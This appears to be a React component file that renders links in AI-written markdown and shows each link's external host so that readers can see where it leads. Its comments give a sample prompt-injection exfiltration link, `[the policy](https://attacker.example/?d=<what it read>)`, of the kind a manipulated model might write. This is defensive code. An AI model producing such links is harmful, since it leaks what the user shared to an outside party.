import type { ComponentProps } from "react";

// Links are resolved as the browser would, against a page on an origin no link can name.
const PAGE = "https://workmind.invalid/page";

/**
 * The host a link leads to when it leaves the app, or null (relative links, anchors, mailto:).
 * Resolved like the browser resolves it, so `//attacker.example/x` (which the browser opens as
 * https://attacker.example/x) counts as leaving.
 */
export function linkHost(href: string | undefined): string | null {
  if (!href) return null;
  try {
    const url = new URL(href, PAGE);
    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
    return url.origin === new URL(PAGE).origin ? null : url.host;
  } catch {
    return null;
  }
}

/** True when the link's whole text is that host, or a URL on it (an autolink, for example). */
function textNamesHost(text: string, host: string): boolean {
  const shown = text.trim();
  if (!shown || /\s/.test(shown)) return false;
  const candidate = /^[a-z][a-z0-9+.-]*:/i.test(shown) || shown.startsWith("//") ? shown : `https://${shown}`;
  try {
    return new URL(candidate, PAGE).host === host;
  } catch {
    return false;
  }
}

/**
 * A link in text a model wrote. Opened in a new tab without opener access, and an absolute link
 * shows where it goes next to its text: a model steered by a document can write
 * `[the policy](https://attacker.example/?d=<what it read>)`, and the reader should see the host
 * before clicking (docs/security/owasp-llm-top10.md, LLM05). Images are never loaded at all
 * (markdown-image.tsx).
 */
export function MarkdownLink(props: ComponentProps<"a"> & { node?: unknown }) {
  // react-markdown passes the hast `node`; it must not reach the DOM.
  const { href, children, ...rest } = { ...props, node: undefined };
  delete rest.node;
  const host = linkHost(href);
  const text = typeof children === "string" ? children : "";
  // Not a substring test: "the policy on intranet.com" contains "t.co".
  const showHost = host !== null && !textNamesHost(text, host);
  return (
    <>
      <a {...rest} href={href} target="_blank" rel="noopener noreferrer nofollow" className="underline underline-offset-2">
        {children}
      </a>
      {showHost ? <span className="ml-0.5 text-xs text-muted-foreground">({host})</span> : null}
    </>
  );
}
